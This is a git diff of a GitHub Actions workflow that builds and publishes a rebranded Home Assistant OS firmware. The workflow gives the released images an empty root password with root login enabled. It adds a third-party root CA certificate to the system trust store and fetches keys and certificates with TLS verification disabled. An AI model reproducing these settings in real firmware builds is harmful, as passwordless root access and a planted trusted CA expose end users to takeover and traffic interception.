@@ -1,43 +1,58 @@
 name: HassOS-AutoBuild
-
 on:
-#  release:
-#    types: [published]
-  #push:
-  #  branches:
-  #    - main
-  #  paths:
-  #    - 'start'
+  # push:
+  #   branches:
+  #     - main
   workflow_dispatch:
     inputs:
       ssh:
         description: 'SSH connection to Actions'
         required: false
         default: 'false'
-  #schedule:
-  #  - cron: 0 18 * * *
-  #watch:
-  #  types: [started]
+  schedule:
+    - cron: '0 18 * * *'
+  watch:
+    types: [started]
 
 env:
   RUN_VALIDATION: true
 
 jobs:
   build:
-    runs-on: ubuntu-18.04
-    #runs-on: ubuntu-16.04
+    #runs-on: self-hosted
+    runs-on: ubuntu-20.04
     if: github.event.repository.owner.id == github.event.sender.id
     
     name: Build ${{matrix.target}}
     strategy:
       fail-fast: false
       matrix:
-        target: [rpi3_64,rpi4_64,ova,generic_x86_64,generic_aarch64]
+        target: [rpi3_64,rpi4_64,rpi5_64,ova,generic_x86_64,generic_aarch64,green,yellow]
 
     steps:
     - name: Checkout
-      uses: actions/checkout@v2
+      uses: actions/checkout@v3
       
+    - name: Get HassOS version
+      id: get_hassos_version
+      run: |
+        ver=$(curl -s https://version.home-assistant.io/stable.json | jq -r '.hassos."ova"')
+        old=$(curl -s https://sumju.net/stable.json | jq -r '.hassos."ova"')
+        echo "HASSOS_VERSION=${ver}" >> $GITHUB_ENV
+        echo "HA_VER=${old}" >> $GITHUB_ENV
+        
+    - name: Compare HassOS versions
+      run: |
+        if [ -z "${{ env.HA_VER }}" ]; then
+          echo "No previous HassOS version found. Storing current version '${{ env.HASSOS_VERSION }}' as old version."
+          export HA_Ver="${{ env.HASSOS_VERSION }}"
+        elif [ "${{ env.HASSOS_VERSION }}" != "${{ env.HA_VER }}" ]; then
+          echo "HassOS version has changed from '${{ env.HA_VER }}' to '${{ env.HASSOS_VERSION }}' . Proceeding with next steps."
+        else
+          echo "HassOS offical version is '${{ env.HASSOS_VERSION }}' already builed . Stopping subsequent steps."
+          exit 1
+        fi
+            
     - name: Initialization environment
       run: |
         #sudo echo "nameserver 1.1.1.1" >> /etc/hosts
@@ -54,37 +69,31 @@ jobs:
       run: |
         df -hT $PWD
         #dpkg-query -W --showformat='${Installed-Size} ${Package} ${Status}\n'|grep -v deinstall|sort -n|awk '{print $1" "$2}'
-        #git clone https://github.com/home-assistant/operating-system.git -b master HassOS
-        git clone https://github.com/home-assistant/operating-system.git -b dev HassOS
-    
+        git clone https://github.com/home-assistant/operating-system.git -b main HassOS
+        #git clone -b main https://github.com/5high/operating-system.git -b dev HassOS
+ 
     - name: Change Settings.
       run: |
+        cp -r rootfs-overlay HassOS/buildroot-external
         cd HassOS
-        #sed -i 's/lists\/\*/lists\/*\ \&\& apt-get clean/g' Dockerfile
-        #sed -i 's/lists\/\*/lists\/*\ \&\& apt-get clean/g' buildroot-external/package/hassio/builder/Dockerfile
+        git submodule update --init
+        wget ${{ secrets.KEY_URL }}/key.pem --no-check-certificate
+        wget ${{ secrets.KEY_URL }}/cert.pem --no-check-certificate
         sed -i 's/-e\ BUILDER_UID/-e TZ=Asia\/Shanghai\ -e BUILDER_UID/g' buildroot-external/package/hassio/hassio.mk 
         sed -i 's/-e\ BUILDER_UID/-e TZ=Asia\/Shanghai\ -e BUILDER_UID/g' scripts/enter.sh
-        #sed -i '/set/a\set\ FORCE_UNSAFE_CONFIGURE=1' scripts/entry.sh
         sed -i 's/-e\ SUPERVISOR_NAME=hassio_supervisor/-e TZ=Asia\/Shanghai\ -e SUPERVISOR_NAME=hassio_supervisor/g' buildroot-external/rootfs-overlay/usr/sbin/hassos-supervisor
-        #sed -i 's/\:\/cache/:\/cache\ -v\ \/etc\/resolv.conf:\/etc\/resolv.conf/g' scripts/enter.sh
         sed -i '/vhdx/d' buildroot-external/scripts/hdd-image.sh
         sed -i '/vdi/d' buildroot-external/scripts/hdd-image.sh
-        #sed -i '/qcow2/d' buildroot-external/scripts/hdd-image.sh
-        #sed -i '/vhdx/d' buildroot-external/board/intel/ova/hassos-hook.sh
-        #sed -i '/vdi/d' buildroot-external/board/intel/ova/hassos-hook.sh
-        #sed -i '/qcow2/d' buildroot-external/board/intel/ova/hassos-hook.sh
-        #rm -rf buildroot-external/rootfs-overlay/etc/docker/.empty        
-        #curl -L https://sumju.net/daemon.json -o buildroot-external/rootfs-overlay/etc/docker/daemon.json
-        sed -i 's/homeassistant/itcommander/g' buildroot-external/configs/${{matrix.target}}_defconfig
-        sed -i 's/Welcome to Home Assistant/Welcome to Home Assistant (IT Commander YouTuBe Channle)/g' buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_TARGET_GENERIC_REMOUNT_ROOTFS_RW=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        if [ "${{matrix.target}}" == "generic_x86_64" ]; then
+          sed -i 's/SYSTEM_SIZE=256M/SYSTEM_SIZE=512M/' buildroot-external/scripts/hdd-image.sh
+        fi
+        #sed -i 's/homeassistant/itcommander/g' buildroot-external/configs/${{matrix.target}}_defconfig
+        sed -i 's/Welcome to Home Assistant/Welcome to Home Assistant ( YouTuBe @itcommander )/g' buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_TARGET_GENERIC_ROOT_PASSWD=\"\"" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_ROOTFS_SKELETON_DEFAULT=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_TARGET_ENABLE_ROOT_LOGIN=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_HOST_LZO=n" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_VIM=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_VIM_RUNTIME=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_NANO=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_NANO_TINY=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_NTP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_NTP_SNTP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
@@ -92,26 +101,35 @@ jobs:
         echo "BR2_PACKAGE_NTPTIME=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_TZDATA=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_PACKAGE_HTOP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_NGINX=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_NGINX_HTTP_GZIP_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_NGINX_HTTP_PROXY_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_NGINX_HTTP_REWRITE_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_SSL_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig   
+        echo "BR2_PACKAGE_NGINX_HTTP_UPSTREAM_IP_HASH_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_UPSTREAM_KEEPALIVE_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_UPSTREAM_RANDOM_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_UPSTREAM_ZONE_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_UPSTREAM_LEAST_CONN_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
+        echo "BR2_PACKAGE_NGINX_HTTP_SUB_MODULE=y" >> buildroot-external/configs/${{matrix.target}}_defconfig 
         echo "BR2_PACKAGE_WGET=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_OPKG=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_OPKG_GPG_SIGN=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_TARGET_INFO=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_TARGET_ROOTFS_EXT2=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_TARGET_ROOTFS_EXT2_4=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_TARGET_ROOTFS_EXT2_SIZE=\"128M\"" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_HOST_E2FSPROGS=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        echo "BR2_PACKAGE_HOST_ZIP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
-        #echo "BR2_PACKAGE_HOST_PARTED=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_ZIP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig
+        echo "BR2_PACKAGE_UNZIP=y" >> buildroot-external/configs/${{matrix.target}}_defconfig    
         echo "BR2_TARGET_ZONELIST=\"default\"" >> buildroot-external/configs/${{matrix.target}}_defconfig
         echo "BR2_TARGET_LOCALTIME=\"Asia/Shanghai\"" >> buildroot-external/configs/${{matrix.target}}_defconfig
-
+        sed -i '/\[Service\]/a RestartSec=10' buildroot/package/nginx/nginx.service
+        sed -i '/\[Service\]/a Restart=always' buildroot/package/nginx/nginx.service
+        sed -i '/After=syslog.target network.target/ s/$/ hassos-supervisor.service/' buildroot/package/nginx/nginx.service
+        sed -i '/cd \$(TARGET_DIR) ;\\/i \ \ \ \ wget -O \$(TARGET_DIR)\/usr\/share\/ca-certificates\/itcommander.crt https:\/\/github.com\/5high\/HassOS-Actions\/raw\/main\/rootfs-overlay\/etc\/ssl\/certs\/rootCA.cer' buildroot/package/ca-certificates/ca-certificates.mk   
+        
     - name: SSH connection to Actions
       uses: P3TERX/ssh2actions@v1.0.0
       if: (github.event.inputs.ssh == 'true' && github.event.inputs.ssh  != 'false') || contains(github.event.action, 'ssh')
       env:
         TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}
         TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
-        
+
     - name: Build
       shell: 'script -q -e -c "bash {0}"'
       id: build
@@ -120,23 +138,62 @@ jobs:
         cd HassOS
         ./scripts/enter.sh make -j$(($(nproc) + 1)) ${{matrix.target}}
         #sudo ./scripts/entry.sh make ${{matrix.target}}
-
-    - name: Upload Firmware
-      uses: actions/upload-artifact@main
-      with:
-        name: ${{matrix.target}}_Firmware
-        path: HassOS/release
+        
+    - name: Get current date
+      id: current_date
+      run: |
+        current_date=$(date +'%Y-%m-%d')
+        echo "CURRENT_DATE=${current_date}" >> $GITHUB_ENV
     
+    - name: Use current date
+      run: echo "Current date is $CURRENT_DATE"
+
+    # - name: Upload Firmware
+    #   uses: actions/upload-artifact@main
+    #   with:
+    #     name: ${{matrix.target}}_Firmware
+    #     path: HassOS/output/images
+
+    - name: Upload images to release
+      id: upload-release
+      uses: svenstaro/upload-release-action@v2
+      with:
+        repo_token: ${{ secrets.GITHUB_TOKEN }}
+        file: HassOS/output/images/haos_*
+        asset_name: ${{ matrix.asset_name }}
+        tag: ${{ env.HASSOS_VERSION }}
+        overwrite: true
+        file_glob: true
+        body: "针对大陆地区网络专门优化的HassOS版本   欢迎关注Youtube频道https://youtube.com/@itcommander   博客地址https://sumju.net   官方硬件优惠卷领取https://sumju.net/?p=7943"
+    
+    - name: Set up Node.js
+      uses: actions/setup-node@v4
+      with:
+        node-version: '20'
+
     - name: Delete workflow runs
-      uses: GitRML/delete-workflow-runs@main
+      uses: 5high/delete-workflow-runs@main
       with:
         retain_days: 1
         keep_minimum_runs: 1
 
     - name: Remove old Releases
-      uses: dev-drprasad/delete-older-releases@v0.1.0
+      uses: dev-drprasad/delete-older-releases@v0.3.2
       with:
-        keep_latest: 3
+        keep_latest: 8
         delete_tags: true
       env:
         GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          
+    - name: Notify on Telegram
+      uses: appleboy/telegram-action@master
+      with:
+        to: ${{ secrets.TELEGRAM_CHAT_ID }}
+        token: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+        message: "New release! Download it [here](${{ steps.upload-release.outputs.browser_download_url }})."
+
+    - name: Trigger download
+      run: |
+        curl -k -d "command=download_file" -X POST -H "Content-Type: application/x-www-form-urlencoded" $URL
+      env:
+        URL: ${{ secrets.URL }}
